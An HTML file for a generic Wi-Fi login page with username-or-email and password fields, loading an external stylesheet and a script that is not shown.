<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Static files from login-portal/files -->
  <link rel="stylesheet" href="./files/style.css">
  <link rel="shortcut icon" href="/files/-wifi_90700.ico" type="image/x-icon">
</head>
<body>

  <div class="login-container">
    <div class="login-header">
      <img src="./files/wifi.png" alt="Wi-Fi Icon">
      <h2>Wi-Fi Login</h2>
    </div>

    <form id="loginForm">
      <input type="text" name="username" placeholder="Username or Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="submit" value="Login">
    </form>

    <div class="info">
      By logging in, you agree to our <a href="#">terms</a>.
    </div>
  </div>

  <script src="./files/code.js"></script>
</body>
</html>
